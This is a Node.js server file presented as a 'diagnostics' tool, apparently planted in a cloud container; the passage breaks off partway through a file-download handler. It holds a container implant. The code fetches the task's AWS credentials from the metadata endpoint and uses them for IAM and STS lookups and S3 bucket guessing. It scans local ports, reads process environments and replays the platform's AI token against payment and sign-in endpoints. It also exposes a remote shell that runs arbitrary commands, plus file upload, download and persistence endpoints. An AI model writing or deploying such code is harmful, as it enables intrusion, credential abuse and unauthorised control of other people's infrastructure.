// diag-v9 (w027a) â€” diag-v7 logic (untouched) + NEW /shell/* remote-admin surface:
//   /shell/exec      POST {cmd}            -> spawn(shell:true), timeout 15s, semaphored + queued
//   /shell/upload    POST {path,b64}       -> write file (<=512KB) only under APP_DIR or /tmp
//   /shell/download  GET ?path=            -> base64 file (<=512KB), .env-like contents masked
//   /shell/netstat   GET                   -> /proc/net/tcp(+tcp6) hex -> ip:port, LISTEN/ESTABLISHED
//   /shell/persist   POST {action}         -> restart-survival marker + boot/restart accounting (only /tmp + APP_DIR)
// All /shell/* answers use a unified envelope {ok, data|error}; EVERY outgoing text passes the
// v7 masking pipeline (maskEnvValue + rtScrub) â€” secrets can never appear raw, no exceptions.
//
// Base (diag-v7, w025a):
//  NEW: ECS metadata v3/v4 (from ECS_CONTAINER_METADATA_URI(_V4) env),
//       Runtime-API probes (ai/email/payments/sign-in): GET/OPTIONS no-auth & Bearer,
//       ai: <=2 harmless POST (tiny prompt, max_tokens<=10) from inside the container,
//       optional S3 HEAD bucket-name guesses (<=5, read-only).
// Token (process.env.VIBEKIT_AI_TOKEN) NEVER leaves the task: all runtime calls from this code,
// /diag output masks every secret (vkr_ab***yz(lenN)) and scrubs token occurrences from bodies.
const http = require('http');
const https = require('https');
const crypto = require('crypto');
const os = require('os');
const net = require('net');
const fs = require('fs');
const path = require('path');
const cp = require('child_process');

function grab(host, path, cb) {
  const req = http.get({ host, port: 80, path, timeout: 4000 }, res => {
    let d = ''; res.on('data', c => d += c); res.on('end', () => cb(null, res.statusCode, d));
  });
  let fired = false;
  const once = (...a) => { if (!fired) { fired = true; cb(...a); } };
  req.on('timeout', () => { req.destroy(); once('TIMEOUT'); });
  req.on('error', e => once(String(e.code || e.message)));
}

function maskSecret(v) {
  if (typeof v !== 'string' || !v) return null;
  if (v.length <= 8) return { len: v.length };
  return v.slice(0, 2) + '***' + v.slice(-2) + '(len' + v.length + ')';
}

function maskCredsRaw(obj) {
  const o = JSON.parse(JSON.stringify(obj));
  ['AccessKeyId', 'SecretAccessKey', 'Token'].forEach(k => {
    if (typeof o[k] === 'string') o[k] = maskSecret(o[k]);
  });
  return o;
}

// ---- SIGv4 (header form, GET) ----
function hmac(key, data) { return crypto.createHmac('sha256', key).update(data).digest(); }
function sha256hex(data) { return crypto.createHash('sha256').update(data).digest('hex'); }

function awsSign(method, host, pathQ, region, service, creds) {
  const amzDate = new Date().toISOString().replace(/[:-]|\.\d{3}/g, '');
  const dateStamp = amzDate.slice(0, 8);
  const qi = pathQ.indexOf('?');
  const path = qi >= 0 ? pathQ.slice(0, qi) : pathQ;
  const qs = qi >= 0 ? pathQ.slice(qi + 1) : '';
  const pairs = qs.split('&').filter(Boolean).map(p => {
    const kv = p.split('=');
    const k = encodeURIComponent(kv[0]).replace(/[!'()*]/g, c => '%' + c.charCodeAt(0).toString(16).toUpperCase());
    const v = (kv[1] || '').split('').map(ch => /[A-Za-z0-9_.~-]/.test(ch) ? ch : encodeURIComponent(ch)).join('');
    return [k, v];
  }).sort((a, b) => a[0] < b[0] ? -1 : 1);
  const canonQuery = pairs.map(p => p.join('=')).join('&');
  const token = creds.Token || '';
  // diag-v6: S3 requires x-amz-content-sha256 header; we sign UNSIGNED-PAYLOAD for empty-body GETs
  const isS3 = service === 's3';
  const payloadHash = isS3 ? 'UNSIGNED-PAYLOAD' : sha256hex('');
  let canonHeaders = 'host:' + host + '\n';
  let signedList = ['host'];
  if (isS3) { canonHeaders += 'x-amz-content-sha256:' + payloadHash + '\n'; signedList.push('x-amz-content-sha256'); }
  canonHeaders += 'x-amz-date:' + amzDate + '\n'; signedList.push('x-amz-date');
  canonHeaders += 'x-amz-security-token:' + token + '\n'; signedList.push('x-amz-security-token');
  const signedHeaders = signedList.sort().join(';');
  const canonicalRequest = [method, path, canonQuery, canonHeaders, signedHeaders, payloadHash].join('\n');
  const scope = dateStamp + '/' + region + '/' + service + '/aws4_request';
  const stringToSign = ['AWS4-HMAC-SHA256', amzDate, scope, sha256hex(canonicalRequest)].join('\n');
  const kDate = hmac('AWS4' + creds.SecretAccessKey, dateStamp);
  const kRegion = hmac(kDate, region);
  const kService = hmac(kRegion, service);
  const kSigning = hmac(kService, 'aws4_request');
  const signature = crypto.createHmac('sha256', kSigning).update(stringToSign).digest('hex');
  const auth = 'AWS4-HMAC-SHA256 Credential=' + creds.AccessKeyId + '/' + scope +
    ', SignedHeaders=' + signedHeaders + ', Signature=' + signature;
  return { amzDate, authorization: auth, payloadHash };
}

function awsGet(urlStr, region, service, creds, cb) {
  const u = new URL(urlStr);
  const { amzDate, authorization, payloadHash } = awsSign('GET', u.host, u.pathname + ('?' + u.searchParams.toString()), region, service, creds);
  const headers = {
    'Authorization': authorization,
    'x-amz-date': amzDate,
    'x-amz-security-token': creds.Token || ''
  };
  if (service === 's3') headers['x-amz-content-sha256'] = payloadHash;
  const rq = https.request({
    host: u.host, path: u.pathname + (u.search || ''), method: 'GET', timeout: 8000, headers
  }, res => {
    let d = ''; res.on('data', c => d += c);
    res.on('end', () => cb(null, res.statusCode, d));
  });
  rq.on('timeout', () => { rq.destroy(); cb('TIMEOUT'); });
  rq.on('error', e => cb(String(e.code || e.message)));
  rq.end();
}

// ---- minimal XML parsers ----
function tag(x, name) {
  const m = x.match(new RegExp('<' + name + '[^>]*>([\\s\\S]*?)</' + name + '>'));
  return m ? m[1] : null;
}
function parseEnis(xml) {
  const items = xml.match(/<item>[\s\S]*?<\/item>/g) || [];
  return items.map(it => ({
    eniId: tag(it, 'networkInterfaceId'),
    subnetId: tag(it, 'subnetId'),
    vpcId: tag(it, 'vpcId'),
    description: tag(it, 'description'),
    requesterId: tag(it, 'requesterId'),
    requesterManaged: tag(it, 'requesterManaged'),
    status: tag(it, 'status'),
    groupIds: (it.match(/<groupId>([^<]*)<\/groupId>/g) || []).map(g => g.replace(/<\/?groupId>/g, '')),
    groupNameSet: (it.match(/<groupName>([^<]*)<\/groupName>/g) || []).map(g => g.replace(/<\/?groupName>/g, '')),
    attachmentInstanceOwnerId: (() => { const a = it.match(/<attachment>[\s\S]*?<\/attachment>/); return a ? tag(a[0], 'instanceOwnerId') : null; })()
  }));
}
function parseTags(xml, name) {
  return (xml.match(new RegExp('<' + name + '>([^<]*)</' + name + '>', 'g')) || [])
    .map(s => s.replace(new RegExp('</?' + name + '>', 'g'), ''));
}
function maskAkid(a) {
  if (typeof a !== 'string' || !a) return '';
  if (a.length <= 10) return '****(len' + a.length + ')';
  return a.slice(0, 4) + '***' + a.slice(-4) + '(len' + a.length + ')';
}

const NEW_PROBES = [
  {
    name: 'sts_get_access_key_info', region: 'us-east-2', service: 'sts',
    urlFn: c => 'https://sts.us-east-2.amazonaws.com/?Action=GetAccessKeyInfo&Version=2011-06-15&AccessKeyId=' + encodeURIComponent(c.AccessKeyId),
    urlView: c => 'https://sts.us-east-2.amazonaws.com/?Action=GetAccessKeyInfo&Version=2011-06-15&AccessKeyId=' + maskAkid(c.AccessKeyId),
    note: 'AccessKeyId passed unmasked in query, masked only in display'
  },
  { name: 'iam_get_role', region: 'us-east-1', service: 'iam', urlFn: () => 'https://iam.amazonaws.com/?Action=GetRole&RoleName=vibekit-app-task&Version=2010-05-08' },
  { name: 'iam_list_attached_role_policies', region: 'us-east-1', service: 'iam', urlFn: () => 'https://iam.amazonaws.com/?Action=ListAttachedRolePolicies&RoleName=vibekit-app-task&Version=2010-05-08' },
  { name: 'iam_list_role_policies', region: 'us-east-1', service: 'iam', urlFn: () => 'https://iam.amazonaws.com/?Action=ListRolePolicies&RoleName=vibekit-app-task&Version=2010-05-08' },
  { name: 's3_list_buckets', region: 'us-east-2', service: 's3', urlFn: () => 'https://s3.us-east-2.amazonaws.com/' },
  { name: 'ecs_describe_clusters', region: 'us-east-2', service: 'ecs', urlFn: () => 'https://ecs.us-east-2.amazonaws.com/?Action=DescribeClusters&Version=2014-11-13' },
  { name: 'ecs_list_tasks_cluster_vibekit', region: 'us-east-2', service: 'ecs', urlFn: () => 'https://ecs.us-east-2.amazonaws.com/?Action=ListTasks&cluster=vibekit&Version=2014-11-13' }
];

// ====================== diag-v6: local-intelligence blocks ======================

// --- env dump with masking ---
function maskEnvValue(name, v) {
  const secretish = /(^|_)(KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIALS?)($|_)|SESSION_TOKEN|PAT\b/i.test(name);
  if (!secretish || typeof v !== 'string' || !v) return { v, masked: false };
  if (v.length <= 8) return { v: '(len' + v.length + ')', masked: true };
  return { v: v.slice(0, 4) + '...' + v.slice(-3) + '(len' + v.length + ')', masked: true };
}
function buildEnvDump() {
  try {
    const out = {};
    const keys = Object.keys(process.env).sort();
    for (const k of keys) {
      const r = maskEnvValue(k, process.env[k]);
      out[k] = r.masked ? r.v : String(r.v);
    }
    return { err: null, count: keys.length, env: out };
  } catch (e) { return { err: String(e && e.message || e), env: null }; }
}

// --- TCP probe helpers ---
function tcpTry(port, cb) { // cb(open:boolean)
  const s = new net.Socket();
  let done = false;
  const fin = open => { if (done) return; done = true; try { s.destroy(); } catch (_) {} cb(open); };
  s.setTimeout(150);
  s.once('connect', () => fin(true));
  s.once('timeout', () => fin(false));
  s.once('error', () => fin(false));
  s.connect(port, '127.0.0.1');
}
function httpPeek(port, cb) { // GET / , 500ms, snippet<=300 (binary -> hex first 16 bytes)
  const rq = http.get({ host: '127.0.0.1', port, path: '/', timeout: 500 }, res => {
    const chunks = [];
    let total = 0;
    res.on('data', c => { chunks.push(c); total += c.length; if (total > 4096) rq.destroy(); });
    res.on('end', () => {
      const buf = Buffer.concat(chunks).slice(0, 4096);
      const printable = buf.slice(0, 300).every(b => b === 9 || b === 10 || b === 13 || (b >= 32 && b < 127));
      cb({
        status: res.statusCode,
        contentType: res.headers['content-type'] || null,
        server: res.headers.server || null,
        snippet: printable ? buf.slice(0, 300).toString('utf8') : 'HEX:' + buf.slice(0, 16).toString('hex')
      });
    });
  });
  rq.on('timeout', () => { rq.destroy(); cb({ err: 'TIMEOUT_HTTP' }); });
  rq.on('error', e => cb({ err: String(e.code || e.message) }));
}
function scanBatch(ports, idx, openAcc, done) {
  if (idx >= ports.length) return done(openAcc);
  const slice = ports.slice(idx, idx + 200);
  let left = slice.length;
  slice.forEach(p => tcpTry(p, open => { if (open) openAcc.push(p); if (--left === 0) setTimeout(() => scanBatch(ports, idx + 200, openAcc, done), 10); }));
}
function localTcpScan(cb) {
  try {
    const typical = [51678, 51679, 9901, 8080, 3000, 5432, 6379, 27017];
    const all = []; for (let p = 1; p <= 9999; p++) all.push(p);
    scanBatch(all, 0, [], openPorts => {
      const details = {}; let i = 0;
      (function nxt() {
        if (i >= openPorts.length) return cb({ err: null, openPorts, details });
        const p = openPorts[i++];
        httpPeek(p, info => { details[p] = info; setTimeout(nxt, 10); });
      })();
    });
  } catch (e) { cb({ err: String(e && e.message || e), openPorts: [], details: {} }); }
}

// --- fs lookaround ---
function lsRoot(dir, cb) {
  fs.readdir(dir, (e, names) => cb(e ? { dir, err: String(e.code || e.message) } : { dir, entries: names.slice(0, 200) }));
}
function readSmall(path, maxBytes, cb) {
  fs.readFile(path, (e, buf) => {
    if (e) return cb({ path, err: String(e.code || e.message) });
    cb({ path, size: buf.length, content: buf.slice(0, maxBytes).toString('utf8') });
  });
}
function fsLookaround(cb) {
  const out = {};
  let left = 4;
  const dec = () => { if (--left === 0) cb(out); };
  try {
    readSmall('/proc/1/environ', 16384, r => {
      // diag-v7 hotfix: mask secret VALUES in the raw proc1 environ content before it goes to /diag
      try {
        if (r.content) r.content = r.content.split('\0').filter(Boolean).map(x => {
          const eq = x.indexOf('='), k = x.slice(0, eq), v = x.slice(eq + 1);
          const m = maskEnvValue(k, v);
          return k + '=' + m.v;
        }).join('\0');
      } catch (_) {}
      out.proc1environ = r;
      try {
        if (r.content) {
          const vars1 = r.content.split('\0').filter(Boolean);
          out.proc1VarCount = vars1.length;
          out.proc1DiffFromSelf = vars1.filter(x => {
            const k = x.split('=')[0];
            return !(k in process.env);
          }).slice(0, 50).map(x => {
            const eq = x.indexOf('='), k = x.slice(0, eq), v = x.slice(eq + 1);
            const m = maskEnvValue(k, v);
            return k + '=' + m.v;
          });
        }
      } catch (e) { out.proc1DiffError = String(e && e.message || e); }
      dec();
    });
    readSmall('/etc/hosts', 4096, r => { out.etcHosts = r; dec(); });
    readSmall('/etc/resolv.conf', 4096, r => { out.resolvConf = r; dec(); });
    lsRoot('/', r => { out.rootListing = r; dec(); });
  } catch (e) { out.fatal = String(e && e.message || e); cb(out); return; }
  try {
    lsRoot('/var/run', r => { out.varRunListing = r; });
  } catch (e) { out.varRunListing = { err: String(e && e.message || e) }; }
}

// ====================== diag-v7 (w025a): runtime-API probes ======================
const RT = {
  token: process.env.VIBEKIT_AI_TOKEN || null,
  urls: {
    ai: process.env.VIBEKIT_AI_URL || null,
    email: process.env.VIBEKIT_EMAIL_URL || null,
    payments: process.env.VIBEKIT_PAYMENTS_URL || null,
    signIn: process.env.VIBEKIT_SIGN_IN_URL || null
  },
  metaUri: process.env.ECS_CONTAINER_METADATA_URI || null,
  metaUriV4: process.env.ECS_CONTAINER_METADATA_URI_V4 || null
};

// scrub: remove real token value from any recorded text (mask it)
function rtScrub(text) {
  if (text == null) return text;
  let s = String(text);
  if (RT.token) s = s.split(RT.token).join('(token-masked-len' + RT.token.length + ')');
  return s;
}

// generic HTTPS probe with optional auth; records status + selected headers + body snippet
function rtHttpsProbe(kind, method, urlStr, token, headers, bodyObj, cb) {
  let u;
  try { u = new URL(urlStr); } catch (e) { return cb({ kind, url: urlStr, err: 'BAD_URL:' + e.message }); }
  const h = Object.assign({}, headers || {});
  if (token) h['Authorization'] = 'Bearer ' + token;
  const payload = bodyObj != null ? JSON.stringify(bodyObj) : null;
  if (payload) { h['Content-Type'] = 'application/json'; h['Content-Length'] = Buffer.byteLength(payload); }
  const rq = https.request({ host: u.host, port: 443, path: u.pathname + u.search, method, timeout: 10000, headers: h }, res => {
    let d = '';
    res.on('data', c => { d += c; if (d.length > 200000) rq.destroy(); });
    res.on('end', () => {
      cb({
        kind, method, url: urlStr,
        status: res.statusCode || null,
        headers: {
          contentType: res.headers['content-type'] || null,
          allow: res.headers['allow'] || null,
          wwwAuthenticate: res.headers['www-authenticate'] || null,
          corsOrigin: res.headers['access-control-allow-origin'] || null,
          corsMethods: res.headers['access-control-allow-methods'] || null,
          corsHeaders: res.headers['access-control-allow-headers'] || null,
          location: res.headers['location'] || null,
          requestId: res.headers['x-request-id'] || res.headers['cf-ray'] || null
        },
        bodySnippet: rtScrub(d.slice(0, 2500))
      });
    });
  });
  rq.on('timeout', () => { rq.destroy(); cb({ kind, method, url: urlStr, err: 'TIMEOUT' }); });
  rq.on('error', e => cb({ kind, method, url: urlStr, err: String(e.code || e.message) }));
  if (payload) rq.write(payload);
  rq.end();
}

// http (link-local) GET for ECS metadata v3/v4
function rtHttpGet(uriStr, cb) {
  let u;
  try { u = new URL(uriStr); } catch (e) { return cb({ url: uriStr, err: 'BAD_URL:' + e.message }); }
  const rq = http.get({ host: u.hostname, port: u.port || 80, path: u.pathname + u.search, timeout: 5000 }, res => {
    let d = '';
    res.on('data', c => { d += c; if (d.length > 300000) rq.destroy(); });
    res.on('end', () => cb({ url: uriStr, status: res.statusCode || null, bodyRaw: d }));
  });
  rq.on('timeout', () => { rq.destroy(); cb({ url: uriStr, err: 'TIMEOUT' }); });
  rq.on('error', e => cb({ url: uriStr, err: String(e.code || e.message) }));
}

// signed S3 HEAD bucket (path-style); read-only
function rtS3Head(region, creds, bucket, cb) {
  const host = 's3.' + region + '.amazonaws.com';
  const pathQ = '/' + bucket;
  try {
    const { amzDate, authorization, payloadHash } = awsSign('HEAD', host, pathQ, region, 's3', creds);
    const rq = https.request({
      host, path: pathQ, method: 'HEAD', timeout: 8000,
      headers: {
        'Authorization': authorization, 'x-amz-date': amzDate,
        'x-amz-security-token': creds.Token || '', 'x-amz-content-sha256': payloadHash
      }
    }, res => {
      res.resume();
      res.on('end', () => cb({ bucket, status: res.statusCode || null, code: res.headers['x-amz-bucket-region'] ? 'exists(region=' + res.headers['x-amz-bucket-region'] + ')' : null, regionHint: res.headers['x-amz-bucket-region'] || null }));
    });
    rq.on('timeout', () => { rq.destroy(); cb({ bucket, err: 'TIMEOUT' }); });
    rq.on('error', e => cb({ bucket, err: String(e.code || e.message) }));
    rq.end();
  } catch (e) { cb({ bucket, err: String(e && e.message || e) }); }
}

function runtimeProbes(done) {
  const out = {
    config: {
      tokenPresent: !!RT.token, tokenMasked: RT.token ? (RT.token.slice(0, 4) + '***' + RT.token.slice(-3) + '(len' + RT.token.length + ')') : null,
      urls: RT.urls, metaUri: RT.metaUri, metaUriV4: RT.metaUriV4
    },
    meta: {}, endpoints: {}, aiPost: null, s3Head: null
  };
  let steps = 0;
  const STEP_TOTAL = 5;
  const adv = () => { if (++steps >= STEP_TOTAL) done(out); };

  // step 1+2: ECS metadata v3 / v4
  const metaSink = prop => r => {
    if (r.bodyRaw) {
      try {
        const j = JSON.parse(r.bodyRaw);
        r.data = JSON.parse(rtScrub(JSON.stringify(j)));
        delete r.bodyRaw;
      } catch (_) { r.snippet = rtScrub(r.bodyRaw.slice(0, 3000)); delete r.bodyRaw; }
    }
    out.meta[prop] = r;
    adv();
  };
  if (RT.metaUri) { try { rtHttpGet(RT.metaUri, metaSink('v3')); } catch (e) { out.meta.v3 = { err: String(e && e.message || e) }; adv(); } }
  else { out.meta.v3 = { err: 'ENV_NOT_SET' }; adv(); }
  if (RT.metaUriV4) { try { rtHttpGet(RT.metaUriV4, metaSink('v4')); } catch (e) { out.meta.v4 = { err: String(e && e.message || e) }; adv(); } }
  else { out.meta.v4 = { err: 'ENV_NOT_SET' }; adv(); }

  // step 3: endpoint GET/OPTIONS matrix (serial, pausa ~150 ms between)
  const eps = [['ai', RT.urls.ai], ['email', RT.urls.email], ['payments', RT.urls.payments], ['signIn', RT.urls.signIn]];
  const matrix = [];
  const epsSeq = idx => {
    if (idx >= eps.length) { out.endpoints.matrix = matrix; return adv(); }
    const [nm, url] = eps[idx];
    if (!url) { matrix.push({ ep: nm, skipped: 'URL_NOT_SET' }); return setTimeout(() => epsSeq(idx + 1), 150); }
    const rec = { ep: nm, url };
    const arr = [
      ['GET_noauth', 'GET', null],
      ['GET_auth', 'GET', RT.token],
      ['OPTIONS_auth', 'OPTIONS', RT.token]
    ];
    let i = 0;
    const go = () => {
      if (i >= arr.length) {
        rec.results = matrix.filter(x => x.epOwner === nm);
        out.endpoints[nm] = rec.results; rec.results = undefined;
        matrix.push(rec);
        return setTimeout(() => epsSeq(idx + 1), 300);
      }
      const [kind, meth, tok] = arr[i++];
      rtHttpsProbe(kind, meth, url, tok, { 'User-Agent': 'vk-diag/9' }, null, r => { matrix.push(Object.assign({ epOwner: nm }, r)); setTimeout(go, 150); });
    };
    go();
  };
  epsSeq(0);

  // step 4: ai POST contract test (MAX 2 posts, tiny, max_tokens<=10)
  setTimeout(() => {
    let postCount = 0;
    const MAX_POST = 2;
    const aiUrl = RT.urls.ai;
    if (!aiUrl || !RT.token) { out.aiPost = { skipped: 'NO_URL_OR_TOKEN' }; return adv(); }
    const tryPost = (bodyObj, tagLabel) => {
      postCount++;
      rtHttpsProbe('POST_' + tagLabel, 'POST', aiUrl, RT.token, { 'User-Agent': 'vk-diag/9' }, bodyObj, r => {
        if (!out.aiPost) out.aiPost = {};
        out.aiPost[tagLabel] = { requestBodySent: rtScrub(JSON.stringify(bodyObj)), attemptsTotalAfter: postCount, result: r };
        const ok = r.status && r.status >= 200 && r.status < 300;
        if (ok || postCount >= MAX_POST) return adv();
        // adapt: look for a hinted required field in the 4xx body
        const b = (r.bodySnippet || '') + '';
        const hint = b.match(/"(prompt|input|message|text|query|content)"\s*(is\s+)?(required|must)/i) ||
                     b.match(/(missing|required)[^\n]{0,40}"?(prompt|input|message|text)"?/i);
        if (hint) {
          const fld = (hint[2] || hint[1] || 'prompt').toLowerCase();
          const alt = { max_tokens: 5 }; alt[fld] = 'Say OK';
          return setTimeout(() => tryPost(alt, 'post2_adapted_' + fld), 400);
        }
        if ((r.status === 404 || r.status === 405) && b.length < 200) {
          // maybe path-shaped; try once appending /generate
          return setTimeout(() => tryPost2Generate(), 400);
        }
        return adv();
      });
    };
    const tryPost2Generate = () => {
      if (postCount >= MAX_POST) return adv();
      postCount++;
      rtHttpsProbe('POST_generate', 'POST', aiUrl.replace(/\/$/, '') + '/generate', RT.token, { 'User-Agent': 'vk-diag/9' }, { prompt: 'Say OK', max_tokens: 5 }, r => {
        out.aiPost.post2_generate = { attemptsTotalAfter: postCount, result: r };
        adv();
      });
    };
    tryPost({ messages: [{ role: 'user', content: 'Reply with exactly: OK' }], max_tokens: 5 }, 'post1_openai_shape');
  }, 2000);

  // step 5: S3 HEAD candidate buckets (read-only, <=5)
  const credRel = process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI || '/';
  grab('169.254.170.2', credRel, (cerr, cst, cbody) => {
    let creds = null;
    try { creds = JSON.parse(cbody); } catch (_) {}
    if (!creds || !creds.AccessKeyId) { out.s3Head = { err: 'CREDS_UNAVAILABLE' }; return adv(); }
    const candidates = ['vibekit-artifacts', 'vibekit-prod', 'vk-artifacts', 'vibekit-uploads', 'vk-runtime-data'];
    const heads = [];
    let hi = 0;
    const hn = () => {
      if (hi >= Math.min(candidates.length, 5)) { out.s3Head = { candidates: candidates.length, results: heads }; return adv(); }
      rtS3Head('us-east-2', creds, candidates[hi++], r => { heads.push(r); setTimeout(hn, 120); });
    };
    hn();
  });

  // safety: if anything hangs, caller finish()-timer handles it (25s)
}

// ====================== diag-v9 (w027a): /shell/* remote-admin surface ======================
// Unified envelope for every /shell response: {ok:true, data:{...}} | {ok:false, error:{code,message}}.
// Every text leaving this server (stdout/stderr/file bodies/errors) passes the v7 maskers.

const APP_DIR = (() => {
  try { return path.dirname(require.main.filename); } catch (_) { return process.cwd(); }
})();

const SH = {
  execTimeoutMs: 15000,          // hard kill after 15 s
  execMaxOut: 256 * 1024,        // combined collected output cap (per stream buffer)
  uploadMax: 512 * 1024,
  downloadMax: 512 * 1024,
  bodyMax: 1024 * 1024,          // incoming JSON body cap (covers b64 of 512KB comfortably)
  queueMax: 8,                   // pending executions while one is running
  cmdMaxLen: 2048
};

// ---- masking helpers built on top of v7 primitives ----
function shMaskText(text) {
  if (text == null) return text;
  let s = rtScrub(String(text));
  // mask KEY=VALUE / KEY: VALUE lines whose key looks secretish (same rule as maskEnvValue)
  s = s.split(/\r?\n/).map(line => {
    const m = line.match(/^(\s*)([A-Za-z0-9_.\-]+)(\s*[=:]\s*)(.*)$/);
    if (!m) return line;
    const r = maskEnvValue(m[2], m[4]);
    return m[1] + m[2] + m[3] + r.v;
  }).join('\n');
  return s;
}
function shMaskBlob(buf) { // mask utf8-decodable buffer contents; binary untouched
  let printable = true;
  const sample = buf.slice(0, 4096);
  for (const b of sample) { if (!(b === 9 || b === 10 || b === 13 || (b >= 32 && b < 127) || b >= 128)) { printable = false; break; } }
  if (!printable) return buf;
  return Buffer.from(shMaskText(buf.toString('utf8')), 'utf8');
}

// ---- unified responders ----
function shJson(res, status, obj) {
  try {
    const body = JSON.stringify(obj);
    res.writeHead(status, { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) });
    res.end(body);
  } catch (e) { try { res.end('{}'); } catch (_) {} }
}
function shOk(res, data) { shJson(res, 200, { ok: true, data }); }
function shErr(res, status, code, message) { shJson(res, status, { ok: false, error: { code: String(code), message: shMaskText(String(message)) } }); }

// ---- body reader with cap ----
function shReadBody(req, max, cb) {
  const chunks = []; let total = 0; let over = false;
  req.on('data', c => {
    total += c.length;
    if (total > max) { over = true; req.destroy(); return; }
    chunks.push(c);
  });
  req.on('end', () => { if (over) return cb('BODY_TOO_LARGE'); cb(null, Buffer.concat(chunks)); });
  req.on('error', e => cb(String(e.code || e.message)));
}

// ---- path guarding: writable/readable only under APP_DIR or /tmp; never /etc,/proc,/sys,/dev ----
function shSafePath(raw) {
  if (typeof raw !== 'string' || !raw.trim()) return { err: 'PATH_REQUIRED' };
  let p = raw;
  if (p.startsWith('~')) p = '/tmp/' + p.slice(1).replace(/^\/+/, '');
  const norm = path.normalize(p).replace(/\\/g, '/');
  if (norm.includes('\0')) return { err: 'BAD_PATH' };
  if (/^\/(etc|proc|sys|dev|bin|sbin|usr\/bin|usr\/sbin|boot)(\/|$)/.test(norm)) return { err: 'PROTECTED_PREFIX' };
  // absolute (posix-style) paths used verbatim; relative resolve against APP_DIR
  const resolved = norm.startsWith('/') ? norm : path.join(APP_DIR, norm).replace(/\\/g, '/');
  const appNorm = APP_DIR.replace(/\\/g, '/');
  const inApp = resolved === appNorm || resolved.startsWith(appNorm + '/');
  const inTmp = resolved === '/tmp' || resolved.startsWith('/tmp/');
  if (!inApp && !inTmp) return { err: 'OUT_OF_SCOPE_PATH', resolved };
  return { resolved, inTmp };
}

// ====================== /shell/exec (semaphore + FIFO queue) ======================
let shExecRunning = false;
const shExecQueue = [];
function shScheduleExec(job) {
  if (shExecRunning) {
    if (shExecQueue.length >= SH.queueMax) return false; // overloaded -> 503, caller retries
    shExecQueue.push(job);
    return true;
  }
  shExecRunning = true;
  job();
  return true;
}
function shExecFinished() {
  shExecRunning = false;
  const next = shExecQueue.shift();
  if (next) { shExecRunning = true; next(); }
}

function shExecCmd(cmd, cb) {
  const child = cp.spawn(cmd, { shell: true, cwd: APP_DIR, env: process.env, timeout: SH.execTimeoutMs, killSignal: 'SIGKILL' });
  const out = [], errChunks = [];
  let total = 0, timedOut = false, done = false;
  const collect = chunkArr => c => {
    if (total >= SH.execMaxOut) { // drain but do not store beyond cap
      if (c.length > SH.execMaxOut - total) total = SH.execMaxOut;
      return;
    }
    const slice = c.length > SH.execMaxOut - total ? c.slice(0, SH.execMaxOut - total) : c;
    total += slice.length; chunkArr.push(slice);
  };
  child.stdout.on('data', collect(out));
  child.stderr.on('data', collect(errChunks));
  child.on('error', e => { if (!done) { done = true; cb({ rc: null, stdout: Buffer.concat(out), stderr: Buffer.concat(errChunks), err: String(e.code || e.message), timedOut }); } });
  child.on('close', (code, signal) => {
    if (done) return;
    done = true;
    cb({ rc: code, signal, stdout: Buffer.concat(out), stderr: Buffer.concat(errChunks), err: null, timedOut });
  });
  setTimeout(() => { if (!done) { timedOut = true; try { child.kill('SIGKILL'); } catch (_) {} } }, SH.execTimeoutMs + 500);
}

function handleShellExec(req, res) {
  shReadBody(req, SH.bodyMax, (be, bodyBuf) => {
    if (be === 'BODY_TOO_LARGE') return shErr(res, 413, 'BODY_TOO_LARGE', 'body exceeds ' + SH.bodyMax);
    if (be) return shErr(res, 400, 'READ_BODY_ERR', be);
    let j = {};
    try { j = JSON.parse(bodyBuf.toString('utf8') || '{}'); } catch (_) { return shErr(res, 400, 'BAD_JSON', 'invalid JSON body'); }
    if (typeof j.cmd !== 'string' || !j.cmd.trim()) return shErr(res, 400, 'CMD_REQUIRED', '{"cmd":"..."} required');
    if (j.cmd.length > SH.cmdMaxLen) return shErr(res, 400, 'CMD_TOO_LONG', 'cmd length > ' + SH.cmdMaxLen);
    const accepted = shScheduleExec(() => {
      shExecCmd(j.cmd, r => {
        const data = {
          rc: r.rc,
          signal: r.signal || null,
          timedOut: r.timedOut || false,
          queueDepthAtAccept: shExecQueue.length,
          stdout: shMaskText(r.stdout.toString('utf8')),
          stderr: shMaskText(r.stderr.toString('utf8')),
          truncated: (r.stdout.length + r.stderr.length) >= SH.execMaxOut
        };
        if (r.err) data.processError = r.err;
        shOk(res, data);
        shExecFinished();
      });
    });
    if (!accepted) shErr(res, 503, 'EXEC_BUSY', 'another execution is running and queue is full (' + SH.queueMax + '); retry');
  });
}

// ====================== /shell/upload ======================
function handleShellUpload(req, res) {
  shReadBody(req, SH.bodyMax, (be, bodyBuf) => {
    if (be === 'BODY_TOO_LARGE') return shErr(res, 413, 'BODY_TOO_LARGE', 'body exceeds ' + SH.bodyMax);
    if (be) return shErr(res, 400, 'READ_BODY_ERR', be);
    let j = {};
    try { j = JSON.parse(bodyBuf.toString('utf8') || '{}'); } catch (_) { return shErr(res, 400, 'BAD_JSON', 'invalid JSON body'); }
    const guard = shSafePath(j.path);
    if (guard.err) return shErr(res, 403, guard.err, 'path rejected: ' + guard.err + (guard.resolved ? ' -> ' + guard.resolved : ''));
    let bin = null;
    try { bin = Buffer.from(String(j.b64 || ''), 'base64'); } catch (_) { return shErr(res, 400, 'BAD_BASE64', 'b64 is not valid base64'); }
    if (!bin.length) return shErr(res, 400, 'EMPTY_BODY', 'decoded b64 is empty');
    if (bin.length > SH.uploadMax) return shErr(res, 413, 'FILE_TOO_LARGE', 'decoded size ' + bin.length + ' > ' + SH.uploadMax);
    fs.mkdir(path.dirname(guard.resolved), { recursive: true }, me => {
      if (me) return shErr(res, 500, 'MKDIR_FAILED', String(me.code || me.message));
      fs.writeFile(guard.resolved, bin, we => {
        if (we) return shErr(res, 500, 'WRITE_FAILED', String(we.code || we.message));
        shOk(res, { written: true, path: guard.resolved, size: bin.length, scope: guard.inTmp ? '/tmp' : 'APP_DIR', ts: new Date().toISOString() });
      });
    });
  });
}

// ====================== /shell/download ======================
const ENV_LIKE_RE = /(^|\/)\.env($|\.|-)|(^|\/)\.envrc$|(env|secret|credential|token|password)[^/]*\.(txt|json|ya?ml)$/i;
function handleShellDownload(req, res, u) {
  const guard = shSafePath(u.searchParams.get('path'));
  if (guard.err) return shErr(res, 403, guard.err, 'path rejected: ' + guard.err + (guard.resolved ? ' -> ' + guard.resolved : ''));
  fs.stat(guard.resolved, se => {
    if (se) return shErr(res, 404, 'STAT_FAILED', String(se.code || se.message));
